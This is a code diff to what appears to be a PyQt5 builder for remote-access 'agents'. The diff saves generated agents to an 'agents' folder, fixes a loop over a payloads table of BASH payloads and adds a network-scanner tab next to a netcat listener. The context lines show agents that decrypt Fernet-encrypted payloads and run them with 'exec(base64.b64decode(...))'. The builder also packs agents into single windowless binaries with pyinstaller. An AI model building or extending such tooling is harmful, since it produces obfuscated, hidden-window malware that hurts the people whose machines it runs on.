@@ -19,6 +19,7 @@ from PyQt5.QtGui import QPalette, QColor
 from PyQt5.QtCore import Qt
 from PyQt5.QtGui import QTextCursor
 from modules.netcat import ChatServer
+from modules.scanner import ScannerWindow
 import os
 import sys
 from cryptography.fernet import Fernet
@@ -61,14 +62,14 @@ class PopupDialogGenerateAgent(QDialog):
     
 
         
-        agent_name = self.main_window.txt_agent_name.text()+".py"
+        agent_name = "agents/"+self.main_window.txt_agent_name.text()+".py"
         with open(agent_name, 'w') as wf:
             wf.write(self.main_window.txt_agent_output.toPlainText())
         self.txt_output.setPlainText("{} generated".format(agent_name))
 
         if self.main_window.flag_binary.isChecked():
             #--icon=app.ico
-            command = ['pyinstaller', '--onefile','--noconsole', agent_name]
+            command = ['pyinstaller', '--onefile','--noconsole','--distpath','agents', agent_name]
             result = subprocess.run(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE)
             if len(result.stderr)>0:
                 output = result.stderr.decode('utf-8')
@@ -177,7 +178,7 @@ from cryptography.fernet import Fernet
 import base64
 
         """
-        for row_payload in range(1,self.payloads_table.rowCount()):
+        for row_payload in range(0,self.payloads_table.rowCount()):
              
             if self.payloads_table.item(row_payload,2).text()=="BASH":
                 ratc=ratc+"""
@@ -249,7 +250,7 @@ exec(base64.b64decode(decrypted_message))
         #PAYLOADS TABLE
         self.payloads_table = QTableWidget()
         self.payloads_table.setColumnCount(4)
-        self.payloads_table.setRowCount(1)
+        #self.payloads_table.setRowCount(1)
         self.payloads_table.setHorizontalHeaderLabels(["Key", "Payload","Type",""])
         self.payloads_table.setVerticalHeaderLabels(["1"])
         
@@ -332,11 +333,13 @@ exec(base64.b64decode(decrypted_message))
         
         crypt_tab = self.payload_tab()
         agent_tab = self.agent_tab()
+        
         #TABS
         tabs.addTab(crypt_tab, 'Python Agent')
         tabs.addTab(agent_tab, 'Output')
         #modules
         chat_server_tab = ChatServer(self, tabs)
+        scannet_tab = ScannerWindow(self,tabs)
         
         vbox = QVBoxLayout()
         vbox.addWidget(tabs)
